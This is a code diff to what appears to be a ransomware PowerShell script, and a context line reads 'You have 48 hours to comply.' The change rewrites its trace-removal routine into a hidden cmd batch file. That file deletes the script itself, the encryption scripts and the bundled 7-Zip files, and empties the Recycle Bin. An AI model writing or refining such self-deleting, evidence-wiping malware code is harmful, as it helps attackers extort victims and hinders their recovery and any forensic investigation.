@@ -1019,53 +1019,42 @@ You have 48 hours to comply.
     Write-Status "Removing script traces..." -Type Info
 
     # Create a cleanup script that will delete this PowerShell script
-    $cleanupScript = Join-Path $env:TEMP "cleanup_$([System.IO.Path]::GetRandomFileName()).ps1"
     $scriptToDelete = $MyInvocation.MyCommand.Path
+    $cleanupScriptName = "cleanup_" + (Get-Random -Minimum 10000 -Maximum 99999) + ".cmd"
+    $cleanupScript = Join-Path $env:TEMP $cleanupScriptName
 
-    $selfDeleteContent = @"
-Start-Sleep -Seconds 2
-Remove-Item -Path '$scriptToDelete' -Force -ErrorAction SilentlyContinue
-Start-Sleep -Seconds 1
-if (Test-Path '$scriptToDelete') {
-    Remove-Item -Path '$scriptToDelete' -Force -ErrorAction SilentlyContinue
-}
-Set-Location '$CurrentDir'
-Remove-Item -Path 'encrypt_files.bat' -Force -ErrorAction SilentlyContinue
-Remove-Item -Path 'encrypt_files.ps1' -Force -ErrorAction SilentlyContinue
-Remove-Item -Path '7z.exe' -Force -ErrorAction SilentlyContinue
-Remove-Item -Path '7z2501-x64.msi' -Force -ErrorAction SilentlyContinue
-Remove-Item -Path '7z2501-x64.exe' -Force -ErrorAction SilentlyContinue
-Remove-Item -Path '7z2501-arm64.exe' -Force -ErrorAction SilentlyContinue
-# Empty recycle bin
-`$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { `$_.Root -match '^[A-Z]:\\`$' }
-foreach (`$drive in `$drives) {
-    `$recycleBin = Join-Path `$drive.Root '`$Recycle.Bin'
-    if (Test-Path `$recycleBin) {
-        Remove-Item -Path `$recycleBin -Recurse -Force -ErrorAction SilentlyContinue
-    }
-}
-Remove-Item -Path '$cleanupScript' -Force -ErrorAction SilentlyContinue
+    # Use a CMD batch file instead of PowerShell for more reliable execution
+    $batchContent = @"
+@echo off
+timeout /t 2 /nobreak >nul
+del /f /q "$scriptToDelete" 2>nul
+timeout /t 1 /nobreak >nul
+if exist "$scriptToDelete" del /f /q "$scriptToDelete" 2>nul
+cd /d "$CurrentDir"
+del /f /q "encrypt_files.bat" 2>nul
+del /f /q "encrypt_files.ps1" 2>nul
+del /f /q "7z.exe" 2>nul
+del /f /q "7z2501-x64.msi" 2>nul
+del /f /q "7z2501-x64.exe" 2>nul
+del /f /q "7z2501-arm64.exe" 2>nul
+rd /s /q "%SYSTEMDRIVE%\`$Recycle.Bin" 2>nul
+del /f /q "$cleanupScript" 2>nul
+exit
 "@
 
     try {
-        # Write cleanup script and ensure it's flushed to disk
-        $selfDeleteContent | Out-File -FilePath $cleanupScript -Encoding ASCII -Force
-        Start-Sleep -Milliseconds 500  # Brief wait to ensure file is written
+        # Write cleanup script
+        [System.IO.File]::WriteAllText($cleanupScript, $batchContent, [System.Text.Encoding]::ASCII)
 
-        # Verify cleanup script exists before launching
-        if (Test-Path $cleanupScript) {
-            if ($DebugMode) {
-                Write-Host "[DEBUG] Self-delete script created: $cleanupScript" -ForegroundColor Magenta
-                Write-Host "[DEBUG] Script to delete: $scriptToDelete" -ForegroundColor Magenta
-            }
-
-            # Launch cleanup script in hidden window
-            Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupScript`"" -NoNewWindow
-
-            if ($DebugMode) { Write-Host "[DEBUG] Self-delete script launched successfully" -ForegroundColor Magenta }
-        } else {
-            Write-Status "Warning: Could not create cleanup script" -Type Warning
+        if ($DebugMode) {
+            Write-Host "[DEBUG] Cleanup script created: $cleanupScript" -ForegroundColor Magenta
+            Write-Host "[DEBUG] Script to delete: $scriptToDelete" -ForegroundColor Magenta
         }
+
+        # Launch cleanup script in hidden window using cmd.exe
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$cleanupScript`"" -WindowStyle Hidden -NoNewWindow
+
+        if ($DebugMode) { Write-Host "[DEBUG] Self-delete script launched successfully" -ForegroundColor Magenta }
     } catch {
         if ($DebugMode) { Write-Host "[DEBUG] Self-delete failed: $($_.Exception.Message)" -ForegroundColor Magenta }
     }
